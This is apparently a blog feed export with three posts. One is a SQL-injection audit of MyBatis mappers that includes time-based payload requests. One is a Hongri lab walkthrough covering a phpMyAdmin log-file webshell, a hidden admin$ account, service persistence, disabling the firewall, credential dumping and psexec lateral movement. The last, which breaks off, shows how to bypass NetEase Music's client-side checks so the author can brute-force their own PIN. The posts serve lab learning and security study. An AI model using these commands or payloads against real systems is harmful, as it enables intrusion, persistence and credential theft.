<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/api/dept</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.70.213:8088</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>200</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.70.213:8088</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.70.213:8088/api/dept/edit/?deptId=8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=DACE0292ACA46CFCCC1F27333A55B644; remember-me=YWRtaW46MTY5NTk3MTQ2NzgxMjpmNzAzM2JlYjI0MThkZmM0NzZmZGFmZTgyZmQyMGE0NQ</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">&#123;&quot;deptId&quot;:&quot;1&quot;,&quot;parentId&quot;:&quot;0&quot;,&quot;deptName&quot;:&quot;市场部门&quot;,&quot;sort&quot;:&quot;123&quot;,&quot;status&quot;:&quot;1&quot;,&quot;dataTree_select_nodeId&quot;:&quot;5&quot;,&quot;dataTree_select_input&quot;:&quot;苏州分公司&quot;,&quot;ancestors&quot;:&quot;(select(if(0,sleep(1),sleep(2))))&quot;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RoleMapper-xml"><a href="#RoleMapper-xml" class="headerlink" title="RoleMapper.xml"></a>RoleMapper.xml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getFuzzyRolesByPage&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.codermy.myspringsecurityplus.admin.entity.MyRole&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;selectRoleContactVo&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;roleName != null and roleName != &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">             r.role_name like CONCAT(&#x27;%&#x27;, #&#123;roleName&#125;, &#x27;%&#x27;)</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 数据范围过滤 --&gt;</span></span><br><span class="line">        $&#123;params.dataScope&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>同DeptMapper.xml，没有参数params.dataScope</p>
<h3 id="UserMapper-xml"><a href="#UserMapper-xml" class="headerlink" title="[*] UserMapper.xml"></a>[*] UserMapper.xml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getFuzzyUserByPage&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.codermy.myspringsecurityplus.admin.entity.MyUser&quot;</span>&gt;</span></span><br><span class="line">    SELECT u.user_id,u.dept_id,u.user_name,u.password,u.nick_name,u.phone,u.email,u.status,u.create_time,u.update_time</span><br><span class="line">    FROM my_user u</span><br><span class="line">    left join my_dept d on u.dept_id = d.dept_id</span><br><span class="line">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;nickName != null and nickName != &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">            AND u.nick_name like CONCAT(&#x27;%&#x27;, $&#123;nickName&#125;, &#x27;%&#x27;)</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;userName != null and userName != &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">            AND u.user_name like CONCAT(&#x27;%&#x27;, $&#123;userName&#125;, &#x27;%&#x27;)</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;deptId != null and deptId != &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">            AND (u.dept_id = #&#123;deptId&#125; OR u.dept_id IN ( SELECT e.dept_id FROM my_dept e WHERE FIND_IN_SET(#&#123;deptId&#125;,ancestors) ))</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 数据范围过滤 --&gt;</span></span><br><span class="line">        $&#123;params.dataScope&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">    ORDER BY u.user_id</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>同DeptMapper.xml，没有参数params.dataScope</p>
<p>然后还有两个${nickName}。这个点比较简单，</p>
<p>就是userName和nickName两个参数</p>
<p>SELECT count(0) FROM my_user u LEFT JOIN my_dept d ON u.dept_id = d.dept_id WHERE u.nick_name LIKE CONCAT(‘%’, (SELECT (if(1, sleep(1), sleep(2)))), ‘%’)</p>
<p>数据包：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/user?page=1&amp;limit=10&amp;userName=&amp;nickName=(select+(if(1%2Csleep(1)%2Csleep(2))))</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.17.0.1:8088</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.17.0.1:8088/api/user/index</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=8EE7D716E26721B50C5C006CC0DDA736; remember-me=YWRtaW46MTY5NTk3NTYyNzM3ODo1YjBkZWE4OWE3MmIzZjhiODhjOTZjODY1ODFhMmQyZg,zhg</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>红日靶场1</title>
    <url>/2021/06/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA11-This-is-Y/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载好三台虚拟机<br>地址：<a class="link" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/<i class="fas fa-external-link-alt"></i></a><br>解压，用vm打开，但是先不要启动虚拟机<br>拓扑图</p>
<p><img src="image-20210622185304581.png" alt="image-20210622185304581"></p>
<p>VM1 web服务器：windows7 x64<br>VM2 域成员：win 2003<br>VM3 域控服务器：win 2008</p>
<p><img src="image-20210622191338099.png" alt="image-20210622191338099"></p>
<p>VMnet1是一个内网环境，win7的net是模拟外网环境，<br>进入vm-&gt;编辑-&gt;虚拟网络编辑器。配置vmnet1为192.168.52.0之外的任意ip段（假如是52的话，3台设备组成的内网就不存在了）<br>配置好后，进入win7，密码hongrisec@2019，启动c盘下的phpstudy，然后可以关了<br>后面因为密码过期。改了密码hongrisec2019.</p>
<h2 id="拿下web服务器"><a href="#拿下web服务器" class="headerlink" title="拿下web服务器"></a>拿下web服务器</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>找到目标IP地址<br>nmap -sP 192.168.247.0/24</p>
<p><img src="image-20210622200721970.png" alt="image-20210622200721970"></p>
<p>nmap扫描端口<br>nmap -sV 192.168.247.132</p>
<p><img src="image-20210622200450400.png" alt="image-20210622200450400"></p>
<p>80，135，3306</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>打开网页，发现是一个php探针，测试root/root弱口令连接数据库</p>
<p><img src="image-20210622200554075.png" alt="image-20210622200554075"></p>
<p>访问<a class="link" href="http://192.168.247.132/phpmyadmin/index.php">http://192.168.247.132/phpmyadmin/index.php<i class="fas fa-external-link-alt"></i></a> 登录后台使用sql执行的功能，修改日志位置来写入webshell<br>打开日志功能<br>set global general_log=on;<br>修改日志文件位置<br>set global general_log_file=’C:\phpStudy\WWW\log3.php’;<br>确认是否成功写入<br>show variables like ‘general_log_file’;</p>
<p>  <img src="image-20210622201116675.png" alt="image-20210622201116675"></p>
<p>然后select’<?php @eval($_POST["cmd1"]);?>‘;<br>之后访问<a class="link" href="http://192.168.247.132/log3.php">http://192.168.247.132/log3.php<i class="fas fa-external-link-alt"></i></a> 确定后，用蚁剑连接上目标</p>
<p><img src="image-20210622201342198.png" alt="image-20210622201342198"></p>
<p>连上去后，上传一个cs的马到C:/Users/Public/，把shell转移到cs。</p>
<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>由于是administrator权限，这里顺便做一个自启动服务的权限维持</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell sc create &quot;aaser&quot; binpath&#x3D; &quot;C:&#x2F;Users&#x2F;Public&#x2F;.klee.exe&quot;</span><br><span class="line">shell sc description &quot;aaser&quot; &quot;description&quot;</span><br><span class="line">shell sc config &quot;aaser&quot; start&#x3D; auto</span><br><span class="line">shell net start &quot;aaser&quot;</span><br></pre></td></tr></table></figure>





<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h3><ul>
<li><p>添加影子用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell net user admin$ 123456abc.. &#x2F;add</span><br><span class="line">shell net localgroup administrators admin$ &#x2F;add</span><br></pre></td></tr></table></figure></li>
<li><p>查询系统是否允许3389远程连接 </p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections</span><br></pre></td></tr></table></figure>
<p>1表示关闭，0表示开启</p>
<ul>
<li><p>先通过修改注册表来设置一下允许远程桌面连接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server &quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure></li>
<li><p>配置一下防火墙，设置为允许远程桌面连接，命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure>
<p>这种时候一般就可以连接上去了</p>
</li>
<li><p>关闭防火墙（可选）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell netsh firewall set opmode disable</span><br><span class="line">shell netsh firewall set opmode mode&#x3D;disable</span><br></pre></td></tr></table></figure></li>
</ul>
<p>后面这块就纯属于自己的学习了，简单的入个门</p>
<h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><p>用的fscan扫描 ：<a class="link" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan<i class="fas fa-external-link-alt"></i></a><br>扫描结果</p>
<p><img src="image-20210622221556626.png" alt="image-20210622221556626"></p>
<ul>
<li><p>查询网络配置信息<br>  ipconfig /all</p>
</li>
<li><p>查询操作系统及软件信息<br>  systeminfo<br>  systeminfo |findstr /B /C:”OS”<br>  这里同时会返回补丁信息，可以去<a class="link" href="https://i.hacking8.com/tiquan">这里<i class="fas fa-external-link-alt"></i></a> 分析</p>
</li>
<li><p>查询系统体系结构<br>  echo %PROCESSOR_ARCHITECTURE%</p>
</li>
<li><p>利用powersHELL 命令，收集软件的版本信息<br>  powershell “Get-WmiObject -class Win32_Product | Select-Object -Property name,version”</p>
</li>
<li><p>查询进程列表<br>  tasklist<br>  tasklist /SVC<br>  查完之后可以去<a class="link" href="https://i.hacking8.com/tiquan">这里<i class="fas fa-external-link-alt"></i></a> 分析一下进程,看看杀软情况</p>
</li>
<li><p>查看本机用户列表<br>  net user<br>  net localgroup administrator</p>
</li>
<li><p>查看当前在线用户<br>  query user || qwinsta</p>
</li>
<li><p>列出或断开本地计算机与所连接的客户端之间的会话（需要管理员权限）<br>  net session</p>
</li>
<li><p>查询端口列表（常用命令）<br>  netstat -ano</p>
</li>
<li><p>查询本机共享列表<br>  net share</p>
</li>
<li><p>查询路由表及所有可用接口的Arp缓存表<br>  route print<br>  arp -a</p>
</li>
<li><p>关于防火墙</p>
<ul>
<li><p>关闭防火墙<br>  netsh advfirewall set allprofiles state off</p>
</li>
<li><p>查看防火墙配置<br>  netsh firewall show config</p>
</li>
<li><p>修改防火墙配置</p>
<ul>
<li><p>windwos server 2003 及之前的版本，允许指定程序全部连接<br>  netsh firewall add allowedprogram c:\nc.exe “allow nc” enable</p>
</li>
<li><p>windows server 2003之后的版本</p>
<ul>
<li><p>允许指定程序进入,命令如下：<br>netsh advfirewall firewall add rule name=”pass nc” dir=in action=allow program=”C:\nc.exe”</p>
</li>
<li><p>允许指定程序退出,命令如下：<br>  netsh advfirewall firewall add rule name=”Allow nc” dir=out action=allow program=”C:\nc.exe”</p>
</li>
<li><p>允许3389端口放行：<br>  netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in localport=3389 action=allow</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>查看代理配置情况<br>  reg query “HKEY_CURRENT_USER\Software\Microsoft\windows\CurrentVersion\INternet settings”</p>
</li>
<li><p>查询域（需要启动Computer Browser服务）<br>  win7 在计算机管理–服务–找到CB服务<br>  net view /domain</p>
<p>  <img src="image-20210624145219643.png" alt="image-20210624145219643"></p>
</li>
<li><p>查询域内所有计算机<br>  net view /domain:god</p>
</li>
<li><p>查询域内所有用户组列表(默认13个)<br>  net group /domain</p>
</li>
</ul>
<p>这三个都返回 “这项请求将在域god.org的域控制器处理”</p>
<ul>
<li>查询域内所有用户组列表(默认13个)<br>  net group /domain</li>
<li>查询所有域成员计算机列表<br>  net group ”domain computers“ /domain</li>
<li>获取密码信息(密码设置要求)<br>  net accounts /domain</li>
</ul>
<p>在 win10 中，输入 wmic /? 会提示 wmic 已弃用，但在 server2012R2，win7 等版本中可以正常使用<br>powershell 中可替代该命令的是 Get-WmiObject:<br>    Get-WmiObject -class win32_product | Select-Object -property name,version</p>
<h3 id="主要流程"><a href="#主要流程" class="headerlink" title="主要流程"></a>主要流程</h3><ul>
<li>判断是否存在域<br>  ipconfig /all<br>  看DNS后缀列表<br>  <img src="image-20210705140528663.png" alt="image-20210705140528663"><br>  dns服务器名称为god.org<br>  判断存在域后，查看域信息：<br>  net view<br>  查看主域信息：<br>  net view /domain<br>  查看时间服务器：<br>  net time /domain</li>
</ul>
<p>发现能够执行，说明此台机器在域中 (若是此命令在显示域处显示 WORKGROUP，则不存在域，若是报错：发生系统错误 5，则存在域，但该用户不是域用户)</p>
<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><ul>
<li><p>1<br>内网两台机器（192.168.52.0/24）无法连接到外网，可以ping百度测试一下。<br>虽然不能连外网，但是可以连接到win7这台机器，而win7这台机器是可以出网的，<br>SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效<br>参考：<a class="link" href="https://www.freebuf.com/column/231111.html">https://www.freebuf.com/column/231111.html<i class="fas fa-external-link-alt"></i></a></p>
</li>
<li><p>2<br>新建一个smb监听器，然后右键目标，点击spawn，选择该监听器，过一会就会出现一个新的会话，可以note一下，以标记区分。</p>
<p><img src="image-20210707151138990.png" alt="image-20210707151138990"><img src="image-20210707151307930.png" alt="image-20210707151307930"></p>
</li>
</ul>
<p><img src="image-20210707151337899.png" alt="image-20210707151337899"></p>
<p>​    ip旁边的两个∞符号表示连接</p>
<ul>
<li>3<br>同时对已经拿到的机器hashdump，logonpasswords。抓取密码，如何net user 发现主机，记录在cs中，方便横向迁移</li>
</ul>
<p><img src="image-20210707145551831.png" alt="image-20210707145551831"><img src="image-20210707145641949.png" alt="image-20210707145641949"></p>
<p>​        第一个箭头指targets的是net user发现的主机，第二个箭头指的credentials是抓取到的用户凭证</p>
<ul>
<li>4<br>在targets中右键一台主机, jump-&gt;psexec</li>
</ul>
<p><img src="image-20210707150824012.png" alt="image-20210707150824012"></p>
<p>​    user,password,domain选择god.org域的那条数据，监听器选择smb监听器，会话选择使用smb派生出来的会话</p>
<p><img src="image-20210707150927138.png" alt="image-20210707150927138"></p>
<p>对另一台机器也做同样的操作，然后等待上线。然后大概就是会有这些机器</p>
<p><img src="image-20210707151908504.png" alt="image-20210707151908504"></p>
<p><img src="image-20210707151919088.png" alt="image-20210707151919088"></p>
<h2 id="对域控继续权限维持"><a href="#对域控继续权限维持" class="headerlink" title="对域控继续权限维持"></a>对域控继续权限维持</h2><p>执行shell nltest /DCLIST:god.org找到域控主机</p>
<p><img src="image-20210707150532452.png" alt="image-20210707150532452"></p>
<p>域控是这台叫OWA的机器，内网ip为192.168.52.138</p>
<p><img src="image-20210707150601704.png" alt="image-20210707150601704"></p>
<p>添加用户，打开3389，关闭防火墙，全套服务走起</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">添加影子用户</span><br><span class="line">shell net user admin$ 123456abc.. &#x2F;add</span><br><span class="line">shell net localgroup administrators admin$ &#x2F;add</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">先通过修改注册表来设置一下允许远程桌面连接：</span><br><span class="line">shell REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server &quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">配置一下防火墙，设置为允许远程桌面连接：</span><br><span class="line">shell netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br><span class="line"></span><br><span class="line">关闭防火墙（可选）</span><br><span class="line">shell netsh firewall set opmode disable</span><br><span class="line">shell netsh firewall set opmode mode&#x3D;disable</span><br></pre></td></tr></table></figure>



<p>由于它在内网环境下，需要用挂代理才可以远程连接到</p>
<p>这里测试了两个方法，对应win和linux去连接远程桌面</p>
<h3 id="linux："><a href="#linux：" class="headerlink" title="linux："></a>linux：</h3><p>CS命令 socks 1234<br>打开后，修改/etc/proxychains.conf<br>添加一行，socks4 127.0.0.1 1234</p>
<p><img src="image-20210707154004916.png" alt="image-20210707154004916"></p>
<p>然后proxychains rdesktop 192.168.52.138<br>就可以连接到远程桌面了，注意要登录到的域</p>
<p><img src="image-20210707154838577.png" alt="image-20210707154838577"></p>
<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>win用的ew</p>
<p>首先把ew传到win7上，启动ew_for_win_32.exe -s ssocksd -l 9876</p>
<p><img src="image-20210707165902521.png" alt="image-20210707165902521"></p>
<p><em>然后关闭防火墙，不关防火墙连不上</em></p>
<p>win10这边，启动proxifier，配置</p>
<p>profile-&gt;proxy servers </p>
<p>填上win7的ip，监听的端口，选择socks5</p>
<p><img src="image-20210707170102967.png" alt="image-20210707170102967"></p>
<p>profile-&gt;proxification rules</p>
<p><img src="image-20210707170312381.png" alt="image-20210707170312381"></p>
<p>然后打开rdp，连接。proxifier这边是可以看到的</p>
<p><img src="image-20210707170349978.png" alt="image-20210707170349978"></p>
<p><img src="image-20210707165804072.png" alt="image-20210707165804072"></p>
]]></content>
  </entry>
  <entry>
    <title>网易云音乐前端解密</title>
    <url>/2023/12/18/%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>我需要解开网易云的青少年模式，密码四位数字，我给忘了。想爆破一下，用小黄鸟抓包后发现，数据都给加密了。</p>
<h1 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>数据包如下:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/weapi/user/setting/teenpattern/close</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>music.163.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>434</span><br><span class="line"><span class="attribute">accept</span><span class="punctuation">: </span>application/json, text/javascript</span><br><span class="line"><span class="attribute">origin</span><span class="punctuation">: </span>https://music.163.com</span><br><span class="line"><span class="attribute">x-requested-with</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">user-agent</span><span class="punctuation">: </span>Mozilla/5.0 (Linux; Android 9; MI 6 Build/PKQ1.190118.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 CloudMusic/0.1.2 NeteaseMusic/8.2.30</span><br><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">referer</span><span class="punctuation">: </span>https://music.163.com/</span><br><span class="line"><span class="attribute">accept-encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">accept-language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"></span><br><span class="line">params=nhyLwglDvPz0T5fsiTNexRnfGk8e5opkRzm马赛克4IlNa3c8KsA%3D%3D&amp;encSecKey=3aea6c31f570a95f马赛克656c2e6a7149d9a410b4254418d3aa538d14c4d489ddd4769a1ab9e5e63cdcd944e4353dee13fcbe7afe1711acb5008</span><br></pre></td></tr></table></figure>

<p>用mt管理器找青少年模式的activity。发现是一个叫做embedbrowserActivity的东西，用jadx没发现什么内容，根据这个activity的英文名，查了一下发现，这其实是一种混合开发<a class="link" href="https://blog.csdn.net/s13383754499/article/details/78869683%E3%80%82%E5%AE%83%E5%AE%9E%E9%99%85%E4%B8%8A%E6%98%AF%E5%8A%A0%E8%BD%BD%E4%BA%86%E4%B8%80%E4%B8%AAhtml%E3%80%82">https://blog.csdn.net/s13383754499/article/details/78869683。它实际上是加载了一个html。<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="4dc994003f6512a7b33102533187bfa0.jpg" alt="4dc994003f6512a7b33102533187bfa0"></p>
<p><img src="image-20231218000430919.png" alt="image-20231218000430919"></p>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>所以开始找那个请求并加载了加密js的html。同样是用小黄鸟，从点击进入青少年模式开始抓包，给我抓了一大堆，一个一个看，果真发现了一个特殊的包。</p>
<p><img src="473dc361995e448e4d7aa266a6c99632_720.jpg" alt="473dc361995e448e4d7aa266a6c99632_720"></p>
<p>数据包url为<a class="link" href="https://music.163.com/st/platform/young/home?bounces=false&amp;type=1&amp;userId=%E9%A9%AC%E8%B5%9B%E5%85%8B">https://music.163.com/st/platform/young/home?bounces=false&amp;type=1&amp;userId=马赛克<i class="fas fa-external-link-alt"></i></a></p>
<p>直接浏览器打开，发现就是那个页面。只不过无法正常像app内一样操作。会提示‘该功能仅限客户端内使用’</p>
<p><img src="image-20231218000854074.png" alt="image-20231218000854074"></p>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>在一顿乱点后发现，虽然无法正常使用解密功能，但是依然可以通过直接访问<a class="link" href="https://music.163.com/st/platform/young/%E5%8F%91%E9%80%81%E5%8A%A0%E5%AF%86%E8%AF%B7%E6%B1%82%E5%8C%85%E3%80%82%E4%BA%8E%E6%98%AF%E5%AE%9A%E4%BD%8D%E5%88%B0%E5%A6%82%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81">https://music.163.com/st/platform/young/发送加密请求包。于是定位到如下的代码<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20231218001223403.png" alt="image-20231218001223403"></p>
<p>先简单说一下结论。</p>
<p>encText， 也就是数据包里的params。使用了两次aes加密。第一次的key为0CoJUm6Qyw8W8jud，iv为0102030405060708。CBC模式。</p>
<p>第二次的key为随机生成，iv还是0102030405060708，也还是CBC模式。</p>
<p>encSecKey，也就是数据包里的encSecKey，使用rsa加密（应该，我没太看懂这块的代码。这里加密的内容是前面第二次aes加密的key）。</p>
<p>现在我要爆破密码需要完成两步，</p>
<ul>
<li><p>1.找到明文数据包。</p>
</li>
<li><p>2.然后将他们加密。</p>
</li>
</ul>
<p>第二步好解决，直接用cdp就好了。关键在于我该如何找到明文数据包。</p>
<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>在上班摸鱼的时候研究了一下，想解密比较难，所以我决定绕开‘该功能仅限客户端内使用’。这里就不说怎么找到的了（花了我一个下午）。直接说操作，</p>
<ol>
<li>首先打开<a class="link" href="https://music.163.com/st/platform/young/home?bounces=false&amp;type=1&amp;userId=502037707%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%90%9C%E7%B4%A2**%E8%AF%A5%E5%8A%9F%E8%83%BD%E4%BB%85%E9%99%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%86%85%E4%BD%BF%E7%94%A8**%E3%80%82%E7%84%B6%E5%90%8E%E7%82%B9%E5%87%BB%E5%85%B3%E9%97%AD%E9%9D%92%E5%B0%91%E5%B9%B4%E6%A8%A1%E5%BC%8F%E6%8C%89%E9%92%AE%EF%BC%8C%E8%BF%99%E9%87%8C%E4%BC%9A%E8%B7%B3%E5%88%B0%60checkAvaliable%60%E5%87%BD%E6%95%B0%E5%86%85%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%99%E9%87%8C%E6%9C%89%E4%B8%AA%E5%85%B3%E9%94%AE%E7%82%B9%E3%80%82%E9%9C%80%E8%A6%81%E8%AE%A9%E8%BF%99%E4%B8%AA%60checkAvaliable%60%E8%BF%94%E5%9B%9Etrue%EF%BC%8C%E5%B0%B1%E6%98%AF%E9%9C%80%E8%A6%81%60e=true%60%E4%B8%94%60w.a.isMobile()=true%60%E3%80%82">https://music.163.com/st/platform/young/home?bounces=false&amp;type=1&amp;userId=502037707，直接搜索**该功能仅限客户端内使用**。然后点击关闭青少年模式按钮，这里会跳到`checkAvaliable`函数内，然后这里有个关键点。需要让这个`checkAvaliable`返回true，就是需要`e=true`且`w.a.isMobile()=true`。<i class="fas fa-external-link-alt"></i></a></li>
</ol>
<p><img src="image-20231218233600670.png" alt="image-20231218233600670"></p>
<ol start="2">
<li>第一个<code>e=true</code>好解决，直接console输入<code>e=true</code>即可。<code>w.a.isMobile()</code>是调用了一个函数，这里需要跳进isMobile()函数内。在这里一行打个断点，等流程进来的时候在console中输入<code>m.isMobile=true</code>就可以改变<code>w.a.isMobile()</code>的返回结果了。不过这个断点的作用不仅仅是为了改变<code>isMobile()</code>的输出结果<del>（其实流程在checkAvaliable函数内的时候就可以输入<code>m.isMobile=true</code>了）</del>，也是为了后面做准备。</li>
</ol>
<p><img src="image-20231218233838395.png" alt="image-20231218233838395"></p>
<ol start="3">
<li>在修改了<code>e=true</code>和<code>w.a.isMobile()=true</code>后，<code>checkAvaliable</code>已经返回true了，此时代码已经走到<code>if (i.checkAvaliable(!0))</code>的下一行<code>if (i.state.loading)</code>了。这里需要修改<code>i.state.loading</code>的值，将其改为false以便绕过’无法验证青少年模式开启状态’。在这之后，是一个三元表达式，流程需要走下面的start。也是简单的修改e为false即可。</li>
</ol>
<p><img src="image-20231218234849032.png" alt="image-20231218234849032"></p>
<ol start="4">
